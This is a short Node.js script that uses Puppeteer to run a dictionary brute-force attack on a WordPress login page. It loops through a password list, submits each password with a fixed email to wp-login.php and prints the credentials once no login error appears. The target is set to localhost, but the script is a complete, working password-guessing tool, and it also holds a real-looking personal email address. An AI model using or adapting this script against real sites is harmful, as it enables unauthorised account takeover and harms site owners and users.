const puppeteer = require('puppeteer');
const fs = require('fs');
(async() => {

    // set the email
    const email = "anas.devriani@gmail.com";

    // set the website without / at the end
    const websiteUrl = "http://localhost/wordpress";

    // read the dictionnary
    const dictionnary = fs.readFileSync('./dictionnary.txt').toString().split(/\r?\n/);

    // start the browser
    const browser = await puppeteer.launch({
        headless: false,
    });

    // open new page
    const page = await browser.newPage();

    // loop through the dictionnary
    for (const passsword of dictionnary) {

        // visit the login page
        await page.goto(`${websiteUrl}/wp-login.php`, {
            waitUntil: 'networkidle2',
        });

        // fill in the email
        await page.waitForXPath(`//*[@id="user_login"]`)
        await page.type('#user_login', email);

        // fill in the password
        await page.type('#user_pass', passsword);

        // click on the login page
        const [loginButton] = await page.$x(`//*[@id="wp-submit"]`);
        await loginButton.click();
        await page.waitForTimeout(3000);

        // check if there is login errors
        const [loginErrors] = await page.$x(`//*[@id="login_error"]`);
        if (!loginErrors) {
            console.log(`Logged in successfully, password : ${email} & password : ${passsword}`);
            break;
        }
    }
    await browser.close();
})();
